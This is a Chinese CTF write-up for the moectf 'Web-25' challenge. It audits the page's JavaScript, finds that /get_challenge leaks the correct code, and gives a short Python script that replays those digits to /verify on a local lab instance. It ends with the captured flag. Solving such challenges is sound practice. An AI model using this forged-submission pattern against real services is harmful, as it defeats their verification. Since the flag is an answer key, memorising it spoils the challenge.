# Web-25｜摸金偶遇 FLAG，拼尽全力难战胜

## 碎碎念

js 代码审计
***
## Writeup

查看 flag 验证逻辑：

```javascript
function getProgressBarText(style) {
	switch (style) {
		case 0:
			return ">>> 等待开始挑战...";
		case 1:
			return ">>> 防破译进程加载中...";
		case 2:
			return ">>> 正在骇入系统...";
		case 3:
			return ">>> 挑战超时";
		case 4:
			return `>>> 挑战已终止，正确密码 ${realCode.join("")}`;
		default:
			fetch("/verify", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					answers: realCode,
					token: myToken
				})
			})
				.then((response) => response.json())
				.then((data) => {
					if (data.correct) {
						const flag = data.flag || "无法获取flag";
						$(".computerTitle").text(`破译完成，已获取如下权限: ${flag}`);
					} else {
						$(".computerTitle").text(`破译失败: ${data.message || "未知错误"}`);
					}
				})
				.catch((error) => {
					console.error("Error verifying solution:", error);
					$(".computerTitle").text("破译完成，但无法获取权限内容");
				});
			$(".decode-item-block").show();
			$(".leftPanel,.inputPanel").hide();
			return (
				">>> 骇入成功" +
				(limitChallenge ? `，挑战用时：${passedTime} 秒` : "")
			);
	}
}
```

再审查一下发现可以通过 get_challenge 得到答案：

```javascript
function generateRandomDigitArray(length) {
	return new Promise((resolve, reject) => {
		fetch(`/get_challenge?count=${length}`)
			.then((response) => {
				if (!response.ok) {
					throw new Error(`HTTP error! status: ${response.status}`);
				}
				return response.json();
			})
			.then((data) => {
				if (data.error) {
					reject(data.error);
				} else {
					const real = data.numbers;
					const guess = Array.from({ length }, () => null);
					myToken = data.token; // 保存 token 到 myToken
					resolve({ real, guess });
				}
			})
			.catch((error) => {
				console.error("Error fetching challenge data:", error);
				reject("Failed to fetch challenge data.");
			});
	});
}
```

那就简单了，直接伪造成功数据包：

```python
import requests

url = "http://127.0.0.1:64159/"

session = requests.Session()
response = session.get(url+'get_challenge?count=9').json()

response['answers'] = response['numbers']
response.pop('numbers')

response = session.post(url+'verify', json=response)
print(response.text)
```

得到最终 flag：`moectf{4d97d1f0-b8d9-9aee-c4eb-8dc1866bd46e}`